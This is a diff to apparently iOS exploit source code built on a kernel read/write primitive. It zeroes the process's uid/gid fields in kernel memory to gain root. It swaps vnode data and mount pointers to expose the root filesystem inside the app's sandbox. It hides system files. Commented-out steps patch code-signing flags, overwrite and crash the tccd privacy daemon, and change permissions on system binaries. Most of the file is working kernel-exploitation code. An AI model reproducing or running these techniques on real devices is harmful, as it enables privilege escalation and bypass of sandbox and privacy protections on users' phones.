@@ -11,6 +11,7 @@
 #include <sys/stat.h>
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
+#import <sys/mount.h>
 
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
@@ -22,8 +23,10 @@ void do_kclose(u64 kfd)
     kclose((struct kfd*)(kfd));
 }
 
-
-
+void do_respring()
+{
+    respringFrontboard();
+}
 
 uint8_t kread8(u64 kfd, uint64_t where) {
     uint8_t out;
@@ -114,6 +117,15 @@ int funProc(u64 kfd, uint64_t proc) {
     
     int p_pgrpid = kread32(kfd, proc + 0x28);
     printf("[i] self proc->p_pgrpid: %d\n", p_pgrpid);
+    
+    kwrite32(kfd, proc + 0x2c, 0x0);
+    kwrite32(kfd, proc + 0x30, 0x0);
+    kwrite32(kfd, proc + 0x34, 0x0);
+    kwrite32(kfd, proc + 0x38, 0x0);
+    kwrite32(kfd, proc + 0x3c, 0x0);
+    kwrite32(kfd, proc + 0x40, 0x0);
+    kwrite32(kfd, proc + 0x44, 0x0);
+    kwrite32(kfd, proc + 0x48, 0x0);
     
     int p_uid = kread32(kfd, proc + 0x2c);
     printf("[i] self proc->p_uid: %d\n", p_uid);
@@ -322,7 +334,65 @@ uint64_t funVnodeChmod(u64 kfd, char* filename, mode_t mode) {
     return 0;
 }
 
-uint64_t funVnodeOverwrite(u64 kfd, char* to, char* from) {
+int funCSFlags(u64 kfd, char* process) {
+    uint64_t pid = getPidByName(kfd, process);
+    uint64_t proc = getProc(kfd, pid);
+
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+    uint32_t csflags = kread32(kfd, proc_ro + 0x1C);
+    printf("[i] %s proc->proc_ro->csflags: 0x%x\n", process, csflags);
+
+#define TF_PLATFORM 0x400
+
+#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
+#define CS_INSTALLER        0x0000008    /* has installer entitlement */
+
+#define    CS_HARD            0x0000100    /* don't load invalid pages */
+#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
+#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
+
+#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
+
+#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
+
+//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
+//    sleep(3);
+//    kwrite32(kfd, proc_ro + 0x1c, csflags);
+
+    return 0;
+}
+
+int funTask(u64 kfd, char* process) {
+    uint64_t pid = getPidByName(kfd, process);
+    uint64_t proc = getProc(kfd, pid);
+    printf("[i] %s proc: 0x%llx\n", process, proc);
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+
+    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
+    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
+
+    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
+    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
+
+    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
+    uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
+    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
+
+
+    /*
+     * RO-protected flags:
+     */
+    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
+    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
+    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
+    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
+    uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
+    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
+
+    return 0;
+}
+
+uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     //16.1.2 offsets
     uint32_t off_p_pfd = 0xf8;
     uint32_t off_fd_ofiles = 0;
@@ -403,8 +473,6 @@ uint64_t funVnodeOverwrite(u64 kfd, char* to, char* from) {
     uint32_t to_m_fsgroup = kread32(kfd, to_v_mount + off_mount_mnt_fsgroup);
     printf("[i] %s to_vnode->v_mount->mnt_fsgroup: %d\n", to, to_m_fsgroup);
     
-    uint64_t to_fd_vnode = kread64(kfd, to_v_data + 0x8);
-    printf("[i] %s to_vnode->v_data->fd_vnode: 0x%llx\n", to, to_fd_vnode);
     
     close(file_index);
     
@@ -420,6 +488,8 @@ uint64_t funVnodeOverwrite(u64 kfd, char* to, char* from) {
     vnode_pac = kread64(kfd, fileglob + off_fg_data);
     uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
     printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
+    
+    
     
     uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
     uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
@@ -457,136 +527,53 @@ uint64_t funVnodeOverwrite(u64 kfd, char* to, char* from) {
     printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
     uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
     printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
-    
     uint64_t from_v_cred_pac = kread64(kfd, from_vnode + off_vnode_v_cred);
     uint64_t from_v_cred = from_v_cred_pac | 0xffffff8000000000;
     printf("[i] %s from_vnode->v_cred: 0x%llx\n", from, from_v_cred);
-
-    uint32_t from_m_fsowner = kread32(kfd, from_v_mount + off_mount_mnt_fsowner);
-    printf("[i] %s from_vnode->v_mount->mnt_fsowner: %d\n", from, from_m_fsowner);
-    uint32_t from_m_fsgroup = kread32(kfd, from_v_mount + off_mount_mnt_fsgroup);
-    printf("[i] %s from_vnode->v_mount->mnt_fsgroup: %d\n", from, from_m_fsgroup);
     
-//    kwrite32(kfd, from_v_data+0x80, 0);
-//    kwrite32(kfd, from_v_data+0x84, 0);
-////
+//    close(file_index);
+    
+    sleep(2);
+    
+    //mnt_devvp
+    kwrite64(kfd, to_v_mount + 0x980, kread64(kfd, from_v_mount + 0x980));
+    
+//    kwrite64(kfd, to_vnode + off_vnode_v_data, 0);
+//    sleep(1);
+    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
+//    kwrite64(kfd, to_v_data + 0x10, kread64(kfd, from_v_data + 0x10));
+//    kwrite64(kfd, to_v_data + 0x18, kread64(kfd, from_v_data + 0x18));
+//    kwrite64(kfd, to_v_data + 0x20, kread64(kfd, from_v_data + 0x20));
+//    kwrite64(kfd, to_v_data + 0x30, kread64(kfd, from_v_data + 0x30));
+//    kwrite64(kfd, to_v_data + 0xc0, kread64(kfd, from_v_data + 0xc0));
+//    kwrite64(kfd, to_v_data + 0x130, kread64(kfd, from_v_data + 0x130));
+//    kwrite64(kfd, to_v_data + 0x148, kread64(kfd, from_v_data + 0x148));
+//    kwrite64(kfd, to_v_data + 0x150, kread64(kfd, from_v_data + 0x150));
+//    kwrite64(kfd, to_v_data + 0x1b8, kread64(kfd, from_v_data + 0x1b8));
+//    kwrite64(kfd, to_v_data + 0x1c0, kread64(kfd, from_v_data + 0x1c0));
+//    kwrite64(kfd, to_v_data + 0x1d0, kread64(kfd, from_v_data + 0x1d0));
+    
+//    kwrite64(kfd, to_v_data + 0x20, kread64(kfd, from_v_data+0x20));
+    
+//        kwrite32(kfd, to_vnode + off_vnode_iocount, from_usecount + 1);
+
+    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
+    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
+    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
+
+//        kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
+//        kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
+//        kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
+//        kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
+//        kwrite64(kfd, to_vnode + 0x30, from_v_ncchildren_tqh_first);
+//        kwrite64(kfd, to_vnode + 0x38, from_v_ncchildren_tqh_last);
+//        kwrite64(kfd, to_vnode + 0x40, from_v_nclinks_lh_first);
+    
+    
 //    //v_data = (struct apfs_fsnode, closed-source...)
 //    //    from_fd_vnode = kread64(kfd, from_v_data + 32);
-////    printf("[i] vnode, %s from_vnode->v_data->fd_vnode: 0x%llx\n", from, from_fd_vnode);// <- vnode
-//
-//    chmod(from, 0644);
-//    printf("[i] from_vnode->v_data + 0x88: 0x%x\n", kread32(kfd, from_v_data+0x88));
-//    chmod(from, 0107777);
-//    printf("[i] from_vnode->v_data + 0x88: 0x%x\n", kread32(kfd, from_v_data+0x88));
-//    kwrite32(kfd, from_v_data+0x88, 0107777);
-//    printf("Changed mode to 0107777, preserving 20 secs");
-//    sleep(20);
-//    kwrite32(kfd, from_v_data+0x88, 0644);
-////
-//    int i = 0x80;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-//    i += 1;
-//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
-    
-    
-//    sleep(2);
-    
-//    kwrite32(kfd, from_v_mount + off_mount_mnt_fsowner, 0);
-//    kwrite32(kfd, from_v_mount + off_mount_mnt_fsgroup, 0);
-    
-    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
-    
-//    kwrite64(kfd, to_v_data + 0x8, from_fd_vnode);
-//
-    kwrite32(kfd, to_vnode + off_vnode_usecount, from_usecount + 1);
-    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, from_v_kusecount + 1);
-    kwrite8(kfd, to_vnode + off_vnode_v_references, from_v_references + 1);
-    
-    //    kwrite32(kfd, to_vnode + off_vnode_iocount, to_iocount + 1);
-//    kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
-//    kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
-//    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
-//    kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
-//    kwrite64(kfd, to_vnode + 0x30, from_v_ncchildren_tqh_first);
-//    kwrite64(kfd, to_vnode + 0x38, from_v_ncchildren_tqh_last);
-//    kwrite64(kfd, to_vnode + 0x40, from_v_nclinks_lh_first);
+//    printf("[i] vnode, %s from_vnode->v_data->fd_vnode: 0x%llx\n", from, from_fd_vnode);// <- vnode
 
-    return 0;
-}
-
-int funCSFlags(u64 kfd, char* process) {
-    print("getting pid crashes the device\n");
-    uint64_t pid = getPidByName(kfd, process);
-    print("getting proc crashes the device\n");
-    uint64_t proc = getProc(kfd, pid);
-    
-    uint64_t proc_ro = kread64(kfd, proc + 0x18);
-    uint32_t csflags = kread32(kfd, proc_ro + 0x1C);
-    printf("[i] %s proc->proc_ro->csflags: 0x%x\n", process, csflags);
-    
-#define TF_PLATFORM 0x400
-
-#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
-#define CS_INSTALLER        0x0000008    /* has installer entitlement */
-
-#define    CS_HARD            0x0000100    /* don't load invalid pages */
-#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
-#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
-
-#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
-
-#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
-    
-//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
-//    sleep(3);
-//    kwrite32(kfd, proc_ro + 0x1c, csflags);
-    
-    return 0;
-}
-
-int funTask(u64 kfd, char* process) {
-    uint64_t pid = getPidByName(kfd, process);
-    uint64_t proc = getProc(kfd, pid);
-    printf("[i] %s proc: 0x%llx\n", process, proc);
-    uint64_t proc_ro = kread64(kfd, proc + 0x18);
-    
-    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
-    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
-    
-    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
-    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
-    
-    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
-    uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
-    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
-    
-    
-    /*
-     * RO-protected flags:
-     */
-    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
-    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
-    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
-    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
-    uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
-    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
-    
     return 0;
 }
 
@@ -605,6 +592,7 @@ int do_fun(u64 kfd) {
     funUcred(kfd, selfProc);
     funProc(kfd, selfProc);
     funVnodeHide(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
+    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/MaterialKit.framework/Assets.car");
 //    funVnodeOverwrite(kfd, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png"); // replace from x to x
 //    funCSFlags(kfd, "launchd");
 //    funTask(kfd, "kfd");
@@ -625,36 +613,61 @@ int do_fun(u64 kfd) {
     //Restore
     funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
 
-    NSString *AAAApath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/AAAA.bin"];
-    remove(AAAApath.UTF8String);
-    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:AAAApath error:nil];
-    
-    
-    print("killing tccd once...\n\n");
-    xpc_crasher("com.apple.tccd");
-    print("killing tccd twice...\n\n");
-    xpc_crasher("com.apple.tccd");
-    print("zzzzz...\n\n");
-//    sleep(3);
-//    funUcred(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
-//    funProc(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
-//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
-//
-//
-//    funVnodeOverwrite(kfd, AAAApath.UTF8String, AAAApath.UTF8String);
+    //    NSString *AAAApath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/AAAA.bin"];
+    //    remove(AAAApath.UTF8String);
+    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:AAAApath error:nil];
+    //
+    //    NSString *BBBBpath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/BBBB.bin"];
+    //    remove(BBBBpath.UTF8String);
+    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:BBBBpath error:nil];
+        
+        NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
+        
+//        NSString *mntPath = [NSString stringWithFormat:@"/"];
+        [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
+        [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
+        
+    //    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
+    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
+        
+    //    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
+    //    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
+    //    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
+    //    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
+    //    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
+        funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/");
+        NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath
+                                                                            error:NULL];
+        NSLog(@"/var directory: %@", dirs);
 
-//    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
+    //    funVnodeOverwriteFile(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
+    //    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
+    //    funVnodeOverwriteFile(kfd, AAAApath.UTF8String, BBBBpath.UTF8String);
+    //    funVnodeOverwriteFile(kfd, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
+        
+    //    xpc_crasher("com.apple.tccd");
+    //    xpc_crasher("com.apple.tccd");
+    //    sleep(10);
+    //    funUcred(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
+    //    funProc(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
+    //    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+        
+        
+    //    funVnodeOverwrite(kfd, AAAApath.UTF8String, AAAApath.UTF8String);
+        
+    //    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
 
 
-//Overwrite tccd:
-//    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
-//    remove(copyToAppDocs.UTF8String);
-//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
-//    chmod(copyToAppDocs.UTF8String, 0755);
-//    funVnodeOverwrite(kfd, selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
-//
-//    xpc_crasher("com.apple.tccd");
-//    xpc_crasher("com.apple.tccd");
+    //Overwrite tccd:
+    //    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
+    //    remove(copyToAppDocs.UTF8String);
+    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
+    //    chmod(copyToAppDocs.UTF8String, 0755);
+    //    funVnodeOverwrite(kfd, selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
+        
+    //    xpc_crasher("com.apple.tccd");
+    //    xpc_crasher("com.apple.tccd");
+
 
     return 0;
 }
